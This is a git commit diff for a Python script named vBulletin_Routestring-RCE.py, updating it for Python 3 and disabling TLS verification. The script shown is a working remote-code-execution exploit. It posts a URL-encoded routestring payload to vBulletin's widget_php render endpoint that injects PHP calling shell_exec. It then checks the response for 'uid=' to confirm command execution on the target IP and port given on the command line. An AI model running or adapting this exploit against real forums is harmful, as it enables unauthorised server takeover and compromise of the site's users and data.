6aaad8e941b8ae9ba828d8fb0b1452867381aecd
ludy-dev <70466565+ludy-dev@users.noreply.github.com>
2020-11-07 19:15:23 +0900

    Update vBulletin_Routestring-RCE.py
    editted code for supporting python3

--- vBulletin_Routestring-RCE.py
+++ vBulletin_Routestring-RCE.py
@@ -6,7 +6,7 @@ import os
 def exploit(dst_addr):
        URL="http://"+dst_addr
        data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')exit%3b%22%7d"}
-       res = requests.post(URL, data=data)
+       res = requests.post(URL, data=data, verify=False)
        response = res.text
 
        p = re.compile('uid=\d')
@@ -21,7 +21,7 @@ if __name__ == "__main__":
        if len(sys.argv) == 2:
               sys.argv.append('80')
        elif len(sys.argv) < 3:
-               print 'Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0])
+               print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
                sys.exit()
        address =(sys.argv[1], sys.argv[2])
        dst_addr=":".join(address)
